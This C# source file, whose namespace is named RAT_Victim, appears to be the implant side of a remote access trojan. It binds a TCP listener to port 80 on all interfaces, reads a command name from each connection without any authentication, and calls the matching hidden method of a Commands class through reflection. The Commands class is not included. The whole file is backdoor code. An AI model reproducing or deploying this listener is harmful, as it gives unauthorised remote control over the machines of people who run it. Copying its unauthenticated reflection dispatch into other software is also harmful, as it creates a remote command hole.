using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;

namespace RAT_Victim
{
    class Program
    {
        public static Socket client;

        static void Main(string[] args)
        {
            StartServer();
        }

        static void StartServer()
        {
            Socket server = new Socket(SocketType.Stream, ProtocolType.Tcp);
            server.Bind(new IPEndPoint(IPAddress.Any, 80));
            server.Listen(0);

            while (true)
            {
                client = server.Accept();
                byte[] buffer = new byte[64];
                int byteCount = client.Receive(buffer);
                string command = Encoding.ASCII.GetString(buffer, 0, byteCount);
                typeof(Commands).GetMethod(command, BindingFlags.Static | BindingFlags.NonPublic).Invoke(null, null);
            }
        }
    }
}
